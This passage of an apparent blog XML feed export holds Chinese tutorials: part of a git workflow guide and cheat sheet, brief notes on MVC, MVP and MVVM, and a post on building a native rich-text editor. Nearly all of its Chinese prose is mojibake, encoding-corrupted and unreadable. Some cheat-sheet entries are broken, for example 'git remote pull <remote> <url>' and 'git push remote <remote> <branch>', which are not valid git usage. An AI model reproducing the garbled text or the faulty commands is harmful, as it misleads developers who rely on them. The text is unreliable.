PSï¼šç›´æŽ¥å·æ‡’pullå¯èƒ½ä¼šå‡ºçŽ°æ²¡æœ‰æ‰¾åˆ°trackingçš„åˆ†æ”¯ 1234567891011MINGW32 /d/appSoft/wampserver/wamp64/www/demo (develop)$ git pullThere is no tracking information for the current branch.Please specify which branch you want to merge with.See git-pull(1) for details.git pull &lt;remote&gt; &lt;branch&gt;If you wish to set tracking information for this branch you can do so with:git branch --set-upstream-to=origin/&lt;branch&gt; develop è¿™æ—¶å€™è¦æ‰‹åŠ¨æ·»åŠ ä¸€ä¸‹å¯¹åº”åˆ†æ”¯ä¾èµ–git branch --set-upstream-to=origin/&lt;branch&gt; develop 12345678910111213141516 MINGW32 /d/appSoft/wampserver/wamp64/www/demo (develop)$ git branch --set-upstream-to=origin/develop developBranch develop set up to track remote branch develop from origin.MINGW32 /d/appSoft/wampserver/wamp64/www/demo (develop)$ git pullremote: Counting objects: 3, done.remote: Compressing objects: 100% (2/2), done.remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0Unpacking objects: 100% (3/3), done.From github.com:wuwhs/demo f848dc7..d696375 develop -&gt; origin/developUpdating f848dc7..d696375Fast-forward demo.txt | 2 ++ 1 file changed, 2 insertions(+) å°†æœ¬åœ°åˆ†æ”¯æäº¤åˆ°å¯¹åº”è¿œç¨‹åˆ†æ”¯ä¸Šï¼Œgit push origin develop:developï¼Œå³ï¼šgit push origin &lt;è¿œç¨‹ä¸»æœº&gt;&lt;æœ¬åœ°åˆ†æ”¯å&gt;:&lt;è¿œç¨‹åˆ†æ”¯å&gt;ï¼Œå¦‚æžœåç§°ä¸€æ ·å¯ä»¥ç®€å†™ï¼Œä¹Ÿå°±æ˜¯git push origin develop 12345678910MINGW32 /d/appSoft/wampserver/wamp64/www/demo (develop)$ git push origin develop:developCounting objects: 9, done.Delta compression using up to 4 threads.Compressing objects: 100% (5/5), done.Writing objects: 100% (9/9), 759 bytes | 0 bytes/s, done.Total 9 (delta 1), reused 0 (delta 0)remote: Resolving deltas: 100% (1/1), done.To git@github.com:wuwhs/demo.git d696375..3c00c0c develop -&gt; develop é¡¹ç›®æµ‹è¯•OKäº†ï¼Œæœ¬åœ°åˆ†æ”¯åˆå¹¶åˆ°masteråˆ†æ”¯ä¸Šï¼Œè¦ç”¨åˆ°git merge &lt;branch&gt; 12345678910MINGW32 /d/appSoft/wampserver/wamp64/www/demo (develop)$ git checkout masterSwitched to branch &apos;master&apos;MINGW32 /d/appSoft/wampserver/wamp64/www/demo (master)$ git merge developUpdating c4d0377..3c00c0cFast-forward demo.txt | 9 +++++++++ 1 file changed, 9 insertions(+) å¸¸ç”¨çš„æ“ä½œå°±ä»¥ä¸Šä¸ƒæ­¥äº†ï¼Œå½“ç„¶ä¼šæœ‰ä¸åŒæƒ…å½¢çš„åº”ç”¨ã€‚ 7. é™„å½•ï¼šgit-cheat-sheetä¸€èˆ¬è€Œè¨€ï¼Œå¸¸ç”¨çš„å°±æ˜¯ä»¥ä¸Šé‚£äº›å‘½ä»¤ï¼Œæœ‰äººä¸“é—¨çš„æ•´ç†äº†ä¸€ä»½æ¯”è¾ƒå…¨ä¸€ç‚¹çš„æ–‡æ¡£git-cheat-sheetï¼Œæ–¹ä¾¿æŸ¥é˜…ã€‚ é…ç½®åˆ—å‡ºå½“å‰é…ç½®ï¼š 1$ git config --list åˆ—å‡ºrepositoryé…ç½®ï¼š 1$ git config --local --list åˆ—å‡ºå…¨å±€é…ç½®ï¼š 1$ git config --global --list åˆ—å‡ºç³»ç»Ÿé…ç½®ï¼š 1$ git config --system --list è®¾ç½®ç”¨æˆ·åï¼š 1$ git config --global user.name &quot;[firstname lastname]&quot; è®¾ç½®ç”¨æˆ·é‚®ç®±ï¼š 1$ git config --global user.email &quot;[valid-email]&quot; è®¾ç½®gitå‘½ä»¤è¾“å‡ºä¸ºå½©è‰²ï¼š 1$ git config --global color.ui auto è®¾ç½®gitä½¿ç”¨çš„æ–‡æœ¬ç¼–è¾‘å™¨è®¾ï¼š 1$ git config --global core.editor vi é…ç½®æ–‡ä»¶Repositoryé…ç½®å¯¹åº”çš„é…ç½®æ–‡ä»¶è·¯å¾„[â€“local]ï¼š 1&lt;repo&gt;/.git/config ç”¨æˆ·å…¨å±€é…ç½®å¯¹åº”çš„é…ç½®æ–‡ä»¶è·¯å¾„[â€“global]ï¼š 1~/.gitconfig ç³»ç»Ÿé…ç½®å¯¹åº”çš„é…ç½®æ–‡ä»¶è·¯å¾„[â€“local]ï¼š 1/etc/gitconfig åˆ›å»ºå¤åˆ¶ä¸€ä¸ªå·²åˆ›å»ºçš„ä»“åº“: 12# é€šè¿‡ SSH$ git clone ssh://user@domain.com/repo.git 12#é€šè¿‡ HTTP$ git clone http://domain.com/user/repo.git åˆ›å»ºä¸€ä¸ªæ–°çš„æœ¬åœ°ä»“åº“: 1$ git init æœ¬åœ°ä¿®æ”¹æ˜¾ç¤ºå·¥ä½œè·¯å¾„ä¸‹å·²ä¿®æ”¹çš„æ–‡ä»¶ï¼š 1$ git status æ˜¾ç¤ºä¸Žä¸Šæ¬¡æäº¤ç‰ˆæœ¬æ–‡ä»¶çš„ä¸åŒï¼š 1$ git diff æŠŠå½“å‰æ‰€æœ‰ä¿®æ”¹æ·»åŠ åˆ°ä¸‹æ¬¡æäº¤ä¸­ï¼š 1$ git add . æŠŠå¯¹æŸä¸ªæ–‡ä»¶çš„ä¿®æ”¹æ·»åŠ åˆ°ä¸‹æ¬¡æäº¤ä¸­ï¼š 1$ git add -p &lt;file&gt; æäº¤æœ¬åœ°çš„æ‰€æœ‰ä¿®æ”¹ï¼š 1$ git commit -a æäº¤ä¹‹å‰å·²æ ‡è®°çš„å˜åŒ–ï¼š 1$ git commit é™„åŠ æ¶ˆæ¯æäº¤ï¼š 1$ git commit -m &apos;message here&apos; æäº¤ï¼Œå¹¶å°†æäº¤æ—¶é—´è®¾ç½®ä¸ºä¹‹å‰çš„æŸä¸ªæ—¥æœŸ: 1git commit --date=&quot;`date --date=&apos;n day ago&apos;`&quot; -am &quot;Commit Message&quot; ä¿®æ”¹ä¸Šæ¬¡æäº¤ï¼ˆè¯·å‹¿ä¿®æ”¹å·²å‘å¸ƒçš„æäº¤è®°å½•!ï¼‰ 1$ git commit --amend ä¿®æ”¹ä¸Šæ¬¡æäº¤çš„committer dateï¼š 1GIT_COMMITTER_DATE=&quot;date&quot; git commit --amend ä¿®æ”¹ä¸Šæ¬¡æäº¤çš„author dateï¼š 1git commit --amend --date=&quot;date&quot; æŠŠå½“å‰åˆ†æ”¯ä¸­æœªæäº¤çš„ä¿®æ”¹ç§»åŠ¨åˆ°å…¶ä»–åˆ†æ”¯ï¼š 123git stashgit checkout branch2git stash pop å°† stashed changes åº”ç”¨åˆ°å½“å‰åˆ†æ”¯ï¼š 1git stash apply åˆ é™¤æœ€æ–°ä¸€æ¬¡çš„ stashed changesï¼š 1git stash drop æœç´¢ä»Žå½“å‰ç›®å½•çš„æ‰€æœ‰æ–‡ä»¶ä¸­æŸ¥æ‰¾æ–‡æœ¬å†…å®¹ï¼š 1$ git grep &quot;Hello&quot; åœ¨æŸä¸€ç‰ˆæœ¬ä¸­æœç´¢æ–‡æœ¬ï¼š 1$ git grep &quot;Hello&quot; v2.5 æäº¤åŽ†å²ä»Žæœ€æ–°æäº¤å¼€å§‹ï¼Œæ˜¾ç¤ºæ‰€æœ‰çš„æäº¤è®°å½•ï¼ˆæ˜¾ç¤ºhashï¼Œ ä½œè€…ä¿¡æ¯ï¼Œæäº¤çš„æ ‡é¢˜å’Œæ—¶é—´ï¼‰ï¼š 1$ git log æ˜¾ç¤ºæ‰€æœ‰æäº¤ï¼ˆä»…æ˜¾ç¤ºæäº¤çš„hashå’Œmessageï¼‰ï¼š 1$ git log --oneline æ˜¾ç¤ºæŸä¸ªç”¨æˆ·çš„æ‰€æœ‰æäº¤ï¼š 1$ git log --author=&quot;username&quot; æ˜¾ç¤ºæŸä¸ªæ–‡ä»¶çš„æ‰€æœ‰ä¿®æ”¹ï¼š 1$ git log -p &lt;file&gt; ä»…æ˜¾ç¤ºè¿œç«¯åˆ†æ”¯ä¸Žè¿œç«¯åˆ†æ”¯æäº¤è®°å½•çš„å·®é›†ï¼š 1$ git log --oneline &lt;origin/master&gt;..&lt;remote/master&gt; --left-right è°ï¼Œåœ¨ä»€ä¹ˆæ—¶é—´ï¼Œä¿®æ”¹äº†æ–‡ä»¶çš„ä»€ä¹ˆå†…å®¹ï¼š 1$ git blame &lt;file&gt; æ˜¾ç¤ºreflogï¼š 1$ git reflog show åˆ é™¤reflogï¼š 1$ git reflog delete åˆ†æ”¯ä¸Žæ ‡ç­¾åˆ—å‡ºæ‰€æœ‰çš„åˆ†æ”¯ï¼š 1$ git branch åˆ—å‡ºæ‰€æœ‰çš„è¿œç«¯åˆ†æ”¯ï¼š 1$ git branch -r åˆ‡æ¢åˆ†æ”¯ï¼š 1$ git checkout &lt;branch&gt; åˆ›å»ºå¹¶åˆ‡æ¢åˆ°æ–°åˆ†æ”¯: 1$ git checkout -b &lt;branch&gt; åŸºäºŽå½“å‰åˆ†æ”¯åˆ›å»ºæ–°åˆ†æ”¯ï¼š 1$ git branch &lt;new-branch&gt; åŸºäºŽè¿œç¨‹åˆ†æ”¯åˆ›å»ºæ–°çš„å¯è¿½æº¯çš„åˆ†æ”¯ï¼š 1$ git branch --track &lt;new-branch&gt; &lt;remote-branch&gt; åˆ é™¤æœ¬åœ°åˆ†æ”¯: 1$ git branch -d &lt;branch&gt; å¼ºåˆ¶åˆ é™¤ä¸€ä¸ªæœ¬åœ°åˆ†æ”¯ï¼šå°†ä¼šä¸¢å¤±æœªåˆå¹¶çš„ä¿®æ”¹ï¼ 1$ git branch -D &lt;branch&gt; ç»™å½“å‰ç‰ˆæœ¬æ‰“æ ‡ç­¾ï¼š 1$ git tag &lt;tag-name&gt; ç»™å½“å‰ç‰ˆæœ¬æ‰“æ ‡ç­¾å¹¶é™„åŠ æ¶ˆæ¯ï¼š 1$ git tag -a &lt;tag-name&gt; æ›´æ–°ä¸Žå‘å¸ƒåˆ—å‡ºå½“å‰é…ç½®çš„è¿œç¨‹ç«¯ï¼š 1$ git remote -v æ˜¾ç¤ºè¿œç¨‹ç«¯çš„ä¿¡æ¯ï¼š 1$ git remote show &lt;remote&gt; æ·»åŠ æ–°çš„è¿œç¨‹ç«¯ï¼š 1$ git remote add &lt;remote&gt; &lt;url&gt; ä¸‹è½½è¿œç¨‹ç«¯ç‰ˆæœ¬ï¼Œä½†ä¸åˆå¹¶åˆ°HEADä¸­ï¼š 1$ git fetch &lt;remote&gt; ä¸‹è½½è¿œç¨‹ç«¯ç‰ˆæœ¬ï¼Œå¹¶è‡ªåŠ¨ä¸ŽHEADç‰ˆæœ¬åˆå¹¶ï¼š 1$ git remote pull &lt;remote&gt; &lt;url&gt; å°†è¿œç¨‹ç«¯ç‰ˆæœ¬åˆå¹¶åˆ°æœ¬åœ°ç‰ˆæœ¬ä¸­ï¼š 1$ git pull origin master ä»¥rebaseæ–¹å¼å°†è¿œç«¯åˆ†æ”¯ä¸Žæœ¬åœ°åˆå¹¶ï¼š 1git pull --rebase &lt;remote&gt; &lt;branch&gt; å°†æœ¬åœ°ç‰ˆæœ¬å‘å¸ƒåˆ°è¿œç¨‹ç«¯ï¼š 1$ git push remote &lt;remote&gt; &lt;branch&gt; åˆ é™¤è¿œç¨‹ç«¯åˆ†æ”¯ï¼š 123$ git push &lt;remote&gt; :&lt;branch&gt; (since Git v1.5.0)# orgit push &lt;remote&gt; --delete &lt;branch&gt; (since Git v1.7.0) å‘å¸ƒæ ‡ç­¾: 1$ git push --tags åˆå¹¶ä¸Žé‡ç½®(Rebase)å°†åˆ†æ”¯åˆå¹¶åˆ°å½“å‰HEADä¸­ï¼š 1$ git merge &lt;branch&gt; å°†å½“å‰HEADç‰ˆæœ¬é‡ç½®åˆ°åˆ†æ”¯ä¸­:è¯·å‹¿é‡ç½®å·²å‘å¸ƒçš„æäº¤! 1$ git rebase &lt;branch&gt; é€€å‡ºé‡ç½®: 1$ git rebase --abort è§£å†³å†²çªåŽç»§ç»­é‡ç½®ï¼š 1$ git rebase --continue ä½¿ç”¨é…ç½®å¥½çš„merge tool è§£å†³å†²çªï¼š 1$ git mergetool åœ¨ç¼–è¾‘å™¨ä¸­æ‰‹åŠ¨è§£å†³å†²çªåŽï¼Œæ ‡è®°æ–‡ä»¶ä¸ºå·²è§£å†³å†²çªï¼š 12$ git add &lt;resolved-file&gt;$ git rm &lt;resolved-file&gt; åˆå¹¶æäº¤ï¼š 1$ git rebase -i &lt;commit-just-before-first&gt; æŠŠä¸Šé¢çš„å†…å®¹æ›¿æ¢ä¸ºä¸‹é¢çš„å†…å®¹ï¼š åŽŸå†…å®¹ï¼š 123pick &lt;commit_id&gt;pick &lt;commit_id2&gt;pick &lt;commit_id3&gt; æ›¿æ¢ä¸ºï¼š 123pick &lt;commit_id&gt;squash &lt;commit_id2&gt;squash &lt;commit_id3&gt; æ’¤é”€æ”¾å¼ƒå·¥ä½œç›®å½•ä¸‹çš„æ‰€æœ‰ä¿®æ”¹ï¼š 1$ git reset --hard HEAD ç§»é™¤ç¼“å­˜åŒºçš„æ‰€æœ‰æ–‡ä»¶ï¼ˆi.e. æ’¤é”€ä¸Šæ¬¡git addï¼‰: 1$ git reset HEAD æ”¾å¼ƒæŸä¸ªæ–‡ä»¶çš„æ‰€æœ‰æœ¬åœ°ä¿®æ”¹ï¼š 1$ git checkout HEAD &lt;file&gt; é‡ç½®ä¸€ä¸ªæäº¤ï¼ˆé€šè¿‡åˆ›å»ºä¸€ä¸ªæˆªç„¶ä¸åŒçš„æ–°æäº¤ï¼‰ 1$ git revert &lt;commit&gt; å°†HEADé‡ç½®åˆ°æŒ‡å®šçš„ç‰ˆæœ¬ï¼Œå¹¶æŠ›å¼ƒè¯¥ç‰ˆæœ¬ä¹‹åŽçš„æ‰€æœ‰ä¿®æ”¹ï¼š 1$ git reset --hard &lt;commit&gt; ç”¨è¿œç«¯åˆ†æ”¯å¼ºåˆ¶è¦†ç›–æœ¬åœ°åˆ†æ”¯ï¼š 1git reset --hard &lt;remote/branch&gt; e.g., upstream/master, origin/my-feature å°†HEADé‡ç½®åˆ°ä¸Šä¸€æ¬¡æäº¤çš„ç‰ˆæœ¬ï¼Œå¹¶å°†ä¹‹åŽçš„ä¿®æ”¹æ ‡è®°ä¸ºæœªæ·»åŠ åˆ°ç¼“å­˜åŒºçš„ä¿®æ”¹ï¼š 1$ git reset &lt;commit&gt; å°†HEADé‡ç½®åˆ°ä¸Šä¸€æ¬¡æäº¤çš„ç‰ˆæœ¬ï¼Œå¹¶ä¿ç•™æœªæäº¤çš„æœ¬åœ°ä¿®æ”¹ï¼š 1$ git reset --keep &lt;commit&gt; åˆ é™¤æ·»åŠ .gitignoreæ–‡ä»¶å‰é”™è¯¯æäº¤çš„æ–‡ä»¶ï¼š 123$ git rm -r --cached .$ git add .$ git commit -m &quot;remove xyz file&quot; å®Œ~ å¯å‚è€ƒæ–‡ç« ï¼š git-guide å»–é›ªå³°gitæ•™ç¨‹ git-scm Git Cheat Sheet ä¸­æ–‡ç‰ˆ]]></content>
      <categories>
        <category>git</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å¯¹MVCã€MVPå’ŒMVVMçš„ç®€å•è®¤è¯†]]></title>
    <url>%2F2017%2F12%2F07%2F%E5%AF%B9MVC%E3%80%81MVP%E5%92%8CMVVM%E7%9A%84%E7%AE%80%E5%8D%95%E8%AE%A4%E8%AF%86%2F</url>
    <content type="text"><![CDATA[1. å…ˆèŠä¸€ä¸‹MVCMVCï¼šModelï¼ˆæ¨¡åž‹ï¼‰ Viewï¼ˆè§†å›¾ï¼‰ Controllerï¼ˆæŽ§åˆ¶å™¨ï¼‰ï¼Œä¸»è¦æ˜¯åŸºäºŽåˆ†å±‚çš„ç›®çš„ï¼Œè®©å½¼æ­¤çš„èŒè´£åˆ†å¼€ã€‚ Viewé€šè¿‡Controllerå’ŒModelè”ç³»ï¼ŒControlleræ˜¯Viewå’ŒModelçš„åè°ƒè€…ï¼Œviewå’ŒModelä¸ç›´æŽ¥è”ç³»ï¼ŒåŸºæœ¬è”ç³»éƒ½æ˜¯å•å‘çš„ã€‚ 2. é¡ºå¸¦æä¸‹MVPMVPï¼šæ˜¯ä»ŽMVCæ¨¡å¼æ¼”å˜è€Œæ¥çš„ï¼Œéƒ½æ˜¯é€šè¿‡Controller/Presenterè´Ÿè´£é€»è¾‘çš„å¤„ç†+Modelæä¾›æ•°æ®+Viewè´Ÿè´£æ˜¾ç¤ºã€‚ åœ¨MVPä¸­ï¼ŒPresenterå®Œå…¨æŠŠViewå’ŒModelè¿›è¡Œåˆ†ç¦»ï¼Œä¸»è¦çš„ç¨‹åºé€»è¾‘åœ¨Presenteré‡Œå®žçŽ°ã€‚å¹¶ä¸”ï¼ŒPresenterå’ŒViewæ˜¯æ²¡æœ‰ç›´æŽ¥å…³è”çš„ï¼Œæ˜¯é€šè¿‡å®šä¹‰å¥½çš„æŽ¥å£è¿›è¡Œäº¤äº’ï¼Œä»Žè€Œä½¿å¾—åœ¨å˜æ›´Viewçš„æ—¶å€™å¯ä»¥ä¿æŒPresenterä¸å˜ã€‚ 3. å†èŠèŠMVVNMVVMï¼šModel + View + ViewModelï¼ŒæŠŠMVCä¸­çš„Controllerå’ŒMVPä¸­çš„Presenteræ”¹æˆViewModel viewçš„å˜åŒ–ä¼šè‡ªåŠ¨æ›´æ–°åˆ°ViewModelï¼ŒViewModelçš„å˜åŒ–ä¹Ÿä¼šè‡ªåŠ¨åŒæ­¥åˆ°Viewä¸Šæ˜¾ç¤ºã€‚è¿™ç§è‡ªåŠ¨åŒæ­¥æ˜¯å› ä¸ºViewModelä¸­çš„å±žæ€§å®žçŽ°äº†Observerï¼Œå½“å±žæ€§å˜æ›´æ—¶éƒ½èƒ½è§¦å‘å¯¹åº”æ“ä½œã€‚ View æ˜¯HTMLæ–‡æœ¬çš„jsæ¨¡æ¿ï¼› ViewModelæ˜¯ä¸šåŠ¡é€»è¾‘å±‚ï¼ˆä¸€åˆ‡jså¯è§†ä¸šåŠ¡é€»è¾‘ï¼Œæ¯”å¦‚è¡¨å•æŒ‰é’®æäº¤ï¼Œè‡ªå®šä¹‰äº‹ä»¶çš„æ³¨å†Œå’Œå¤„ç†é€»è¾‘éƒ½åœ¨viewmodelé‡Œé¢è´Ÿè´£ç›‘æŽ§ä¿©è¾¹çš„æ•°æ®ï¼‰ï¼› Modelæ•°æ®å±‚ï¼Œå¯¹æ•°æ®çš„å¤„ç†ï¼ˆä¸ŽåŽå°æ•°æ®äº¤äº’çš„å¢žåˆ æ”¹æŸ¥ï¼‰ æä¸€ä¸‹æˆ‘ç†Ÿæ‚‰çš„MVVMæ¡†æž¶ï¼švue.jsï¼ŒVue.jsæ˜¯ä¸€ä¸ªæž„å»ºæ•°æ®é©±åŠ¨çš„ web ç•Œé¢çš„æ¸è¿›å¼æ¡†æž¶ã€‚Vue.js çš„ç›®æ ‡æ˜¯é€šè¿‡å°½å¯èƒ½ç®€å•çš„ API å®žçŽ°å“åº”çš„æ•°æ®ç»‘å®šå’Œç»„åˆçš„è§†å›¾ç»„ä»¶ã€‚æ ¸å¿ƒæ˜¯ä¸€ä¸ªå“åº”çš„æ•°æ®ç»‘å®šç³»ç»Ÿã€‚ 4. ä¸€å¥è¯æ€»ç»“ä¸‹ä¸åŒä¹‹å¤„MVCä¸­è”ç³»æ˜¯å•å‘çš„ï¼ŒMVPä¸­På’ŒVé€šè¿‡æŽ¥å£äº¤äº’ï¼ŒMVVPçš„è”ç³»æ˜¯åŒå‘çš„]]></content>
      <categories>
        <category>å…¶å®ƒ</category>
      </categories>
      <tags>
        <tag>è®¾è®¡æ¨¡å¼</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[åŽŸç”Ÿå¯Œæ–‡æœ¬ç¼–è¾‘å™¨]]></title>
    <url>%2F2017%2F11%2F20%2F%E5%8E%9F%E7%94%9F%E5%AF%8C%E6%96%87%E6%9C%AC%E7%BC%96%E8%BE%91%E5%99%A8%2F</url>
    <content type="text"><![CDATA[å‰è¨€ä¹‹å‰æ²¡æœ‰æŽ¥è§¦è¿‡å¯Œæ–‡æœ¬ç¼–è¾‘å™¨åŽŸç†ï¼Œåœ¨é¡µé¢å…‰æ ‡èƒ½åœ¨æ–‡æœ¬ä¹‹é—´éšæ„é€‰æ‹©ï¼Œåˆ é™¤å’Œè¾“å…¥å¾ˆå¥½å¥‡ï¼Œä¸€ç›´ä»¥ä¸ºæ˜¯ä¸€ç§hackæŠ€æœ¯ï¼ŒåŽŸæ¥é¡µé¢æœ¬èº«æœ‰çš„ä¸€ä¸ªå±žæ€§ï¼Œé…åˆå®žçŽ°è¿˜æœ‰jsçš„æ–¹æ³•å’Œå±žæ€§ã€‚ å®žçŽ°åŽŸç†å®žçŽ°å¯Œæ–‡æœ¬æ•ˆæžœæœ‰ä¸¤ç§æ–¹æ³•ï¼š1. iframe+designModeï¼Œ2. contenteditableã€‚ æ–¹æ³•ä¸€ï¼šiframe+designModeé¡µé¢ä¸­iframeåµŒå…¥ä¸€ä¸ªå­é¡µé¢ï¼ŒæŠŠiframeçš„å±žæ€§designModeè®¾ä¸ºonï¼Œè¿™ä¸ªå­é¡µé¢çš„æ‰€æœ‰å†…å®¹å°±å¯ä»¥æƒ³ä½¿ç”¨æ–‡å­—å¤„ç†è½¯ä»¶ä¸€æ ·ï¼Œå¯¹æ–‡æœ¬è¿›è¡ŒåŠ ç²—ã€æ–œä½“ç­‰è®¾ç½®ã€‚ ä¸»é¡µé¢ 12345678910111213141516171819&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta http-equiv="X-UA-Compatible" content="ie=edge"&gt; &lt;title&gt;å¯Œæ–‡æœ¬ç¼–è¾‘&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;iframe src="./content.html" name="richedit" style="width:400px;height:300px;"&gt;&lt;/iframe&gt; &lt;script&gt; window.addEventListener('load', function () &#123; window.frames['richedit'].document.designMode = 'on'; &#125;, false); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; content.htmlå­é¡µé¢ 1234567891011121314151617181920&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta http-equiv="X-UA-Compatible" content="ie=edge"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;å¯Œæ–‡æœ¬ç¼–è¾‘å™¨æ ‡é¢˜&lt;/h1&gt; &lt;header&gt; &lt;nav&gt;å¯¼èˆªæ &lt;/nav&gt; &lt;/header&gt; &lt;main&gt; &lt;section&gt;å†…å®¹åŒºå—&lt;/section&gt; &lt;section&gt;è¿™é‡Œæ˜¯ä¸€äº›å†…å®¹ï¼Œè¿™é‡Œæ˜¯ä¸€äº›å†…å®¹ï¼Œè¿™é‡Œæ˜¯ä¸€äº›å†…å®¹&lt;/section&gt; &lt;/main&gt; &lt;footer&gt;åº•éƒ¨ç‰ˆæƒç›¸å…³ç”³æ˜Ž&lt;/footer&gt;&lt;/body&gt;&lt;/html&gt; å®žçŽ°æ•ˆæžœ æ–¹æ³•äºŒï¼šcontenteditableå¯ä»¥æŠŠcontenteditableå±žæ€§åº”ç”¨åˆ°é¡µé¢ä¸­çš„ä»»ä½•å…ƒç´ ï¼Œç„¶åŽç”¨æˆ·ç«‹å³å°±å¯ä»¥ç¼–è¾‘è¯¥å…ƒç´ ï¼Œè€Œä¸éœ€è¦iframeé¡µã€‚ 12345678910&lt;section class="editable" id="richedit"&gt; &lt;h2&gt;æ ‡é¢˜æ &lt;/h2&gt; &lt;nav&gt;å¯¼èˆªæ &lt;/nav&gt; &lt;article&gt;å†…å®¹ä¸»ä½“éƒ¨åˆ†&lt;/article&gt;&lt;/section&gt;&lt;script&gt; $richedit = document.getElementById('richedit'); $richedit.contentEditable = 'true';&lt;/script&gt; å®žçŽ°æ•ˆæžœ æ“ä½œå¯Œæ–‡æœ¬åªå±•ç¤ºå¯Œæ–‡æœ¬çš„æ•ˆæžœæ„ä¹‰ä¸å¤§ï¼Œå®žé™…åº”ç”¨ä¸­ï¼Œæ›´å¤šç»“åˆç”¨æˆ·æ“ä½œäº¤äº’ï¼Œäº§ç”Ÿæƒ³è¦çš„æ•ˆæžœï¼Œjsä¸­å·²æä¾›ç›¸åº”apiã€‚ document.execCommand()document.execCommand()å¯¹æ–‡æ¡£æ‰§è¡Œé¢„å®šä¹‰çš„å‘½ä»¤ï¼Œè€Œä¸”å¯ä»¥åº”ç”¨å¤§å¤šæ•°æ ¼å¼ã€‚å¯ä»¥ä¼ é€’3ä¸ªå‚æ•°ï¼šè¦æ‰§è¡Œå‘½ä»¤çš„åç§°ã€æµè§ˆå™¨æ˜¯å¦ä¸ºå‘½ä»¤æä¾›ç”¨æˆ·ç•Œé¢çš„ä¸€ä¸ªå¸ƒå°”å€¼å’Œæ‰§è¡Œå‘½ä»¤å¿…é¡»çš„å€¼ï¼ˆæ— éœ€åˆ™ä¸ºnullï¼‰ã€‚ è®¾ç½®ç²—ä½“document.execCommand(&#39;bold&#39;, false, null); ps:éœ€è¦æ³¨æ„çš„æ˜¯æ‰§è¡Œboldå‘½ä»¤ï¼ŒIEå’ŒOperaä¼šä½¿ç”¨&lt;strong&gt;æ ‡ç­¾åŒ…å›´æ–‡æœ¬ï¼ŒSafariå’ŒChromeä½¿ç”¨&lt;b&gt;æ ‡ç­¾ï¼Œè€ŒFirefoxåˆ™ä½¿ç”¨&lt;span&gt;æ ‡ç­¾ï¼Œç”±äºŽå„ä¸ªæµè§ˆå™¨å®žçŽ°å‘½ä»¤çš„æ–¹å¼ä¸åŒï¼ŒåŠ ä¸Šé€šè¿‡innerHTMLå®žçŽ°è½¬åŒ–çš„æ–¹å¼ä¹Ÿä¸ä¸€æ ·ï¼Œæ‰€ä»¥ä¸èƒ½æŒ‡æœ›å¯Œæ–‡æœ¬ç¼–è¾‘å™¨ä¼šäº§ç”Ÿä¸€è‡´çš„HTMLã€‚ è®¾ç½®æ–œä½“ document.execCommand(&#39;italic&#39;, false, null) è®¾ç½®å±…ä¸­å¯¹é½document.execCommand(&#39;justifycenter&#39;, false, null); è®¾ç½®æ’å…¥å›¾ç‰‡document.execCommand(&#39;insertimage&#39;, false, &#39;./position.png&#39;); è®¾ç½®å­—ä½“å¤§å°document.execCommand(&#39;fontsize&#39;, false, this.value); å½“ç„¶ï¼Œè¿˜æœ‰ä¸€äº›å…¶ä»–çš„è®¾ç½®å‘½ä»¤ï¼Œæ¯”å¦‚backcolorè®¾ç½®èƒŒæ™¯è‰²ï¼Œindentç¼©è¿›æ–‡æœ¬ï¼Œformatblockè¦åŒ…å›´å½“å‰æ–‡æœ¬å—HTMLæ ‡ç­¾ï¼Œcopyå°†é€‰ä¸­æ–‡æœ¬å¤åˆ¶åˆ°å‰ªè´´æ¿ç­‰ã€‚ é™¤äº†å‘½ä»¤ä¹‹å¤–ï¼Œè¿˜æœ‰äºŽä¹‹ç›¸å…³çš„ä¸€äº›æ–¹æ³•ï¼š document.queryCommandEnabled()æ£€æµ‹æŸä¸ªå‘½ä»¤æ˜¯å¦å¯ä»¥é’ˆå¯¹å½“å‰é€‰æ‹©çš„æ–‡æœ¬ã€‚æ¯”å¦‚document.queryCommandEnabled(&#39;bold&#39;)è¿”å›žtrueè¡¨ç¤ºå¯¹å½“å‰é€‰ä¸­çš„æ–‡æœ¬å¯ä»¥æ‰§è¡Œboldå‘½ä»¤ã€‚ document.queryCommandState()ç¡®å®šæ˜¯å¦å·²å°†æŒ‡å®šå‘½ä»¤åº”ç”¨åˆ°é€‰æ‹©çš„æ–‡æœ¬ã€‚æ¯”å¦‚document.queryCommandState(&#39;bold&#39;)è¿”å›žtrueè¡¨ç¤ºå½“å‰é€‰ä¸­çš„æ–‡æœ¬ç”¨äº†boldå‘½ä»¤åŠ ç²—çš„ã€‚ document.queryCommandValue()èŽ·å–æ‰§è¡Œå‘½ä»¤ä¼ å…¥çš„å€¼ã€‚æ¯”å¦‚document.queryCommandValue(&#39;fontsize&#39;)è¿”å›ž5ï¼Œåˆ™ç”¨fontsizeå‘½ä»¤ä¼ å…¥çš„å€¼æ˜¯5ã€‚ å¯Œæ–‡æœ¬é€‰åŒºä¸ºäº†æ›´ç²¾ç»†åŒ–æŽ§åˆ¶å¯Œæ–‡æœ¬ç¼–è¾‘å™¨çš„å†…å®¹ï¼Œå¯ä»¥ä½¿ç”¨document.getSelection()æ–¹æ³•ï¼Œè¿”å›žSelectionå¯¹è±¡ã€‚åœ¨Selectionå¯¹è±¡ä¸Šæä¾›äº†å¾ˆå¤šå®žç”¨çš„æ–¹æ³•ã€‚ 1234567891011121314var selection = document.getSelection();console.log('å½“å‰é€‰ä¸­çš„æ–‡æœ¬ï¼š');console.log(selection.toString());// å–å¾—ä»£è¡¨é€‰åŒºçš„èŒƒå›´var range = selection.getRangeAt(0);console.log(range);// åŒ…è£¹ä¸€ä¸ªæ ‡ç­¾ä½¿å¾—é€‰ä¸­å†…å®¹çªå‡ºvar span = document.createElement('span');span.style.backgroundColor = '#f0f';range.surroundContents(span);console.log('å½“å‰æ–‡æœ¬ç¼–è¾‘å™¨å†…å®¹ï¼š');console.log($richedit.innerHTML); 